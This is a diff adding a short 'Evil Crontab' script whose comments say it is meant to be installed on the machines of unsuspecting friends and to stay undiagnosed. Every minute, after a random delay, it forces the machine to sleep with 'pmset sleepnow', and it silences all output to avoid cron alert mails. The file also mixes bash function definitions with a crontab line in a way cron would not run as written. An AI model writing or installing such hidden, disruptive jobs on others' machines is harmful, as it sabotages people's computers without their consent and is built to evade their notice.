@@ -1,0 +1,26 @@
+#!/bin/bash
+#
+# Evil Crontab™
+# Meant to be installed on the machines of your unsuspecting friends.
+# Designed to be subtle in its evilness, and aims to have its effects
+# go not unnoticed, but undiagnosed for as long as possible.
+#
+#┌───────────── minute (0 - 59)
+#│ ┌───────────── hour (0 - 23)
+#│ │ ┌───────────── day of month (1 - 31)
+#│ │ │ ┌───────────── month (1 - 12)
+#│ │ │ │ ┌───────────── day of week (0 - 6) (Sunday to Saturday;
+#│ │ │ │ │                                       7 is also Sunday on some systems)
+#│ │ │ │ │
+
+# Waits for some time between 15 and 45 minutes
+function wait_a_while() {
+  sleep $(((15 * 60) + (RANDOM * 1800 / 32767)))
+}
+
+# Avoid cron alert mails
+function run_silently() {
+  eval "${@}" > /dev/null 2>&1
+}
+
+* * * * * wait_a_while && run_silently pmset sleepnow
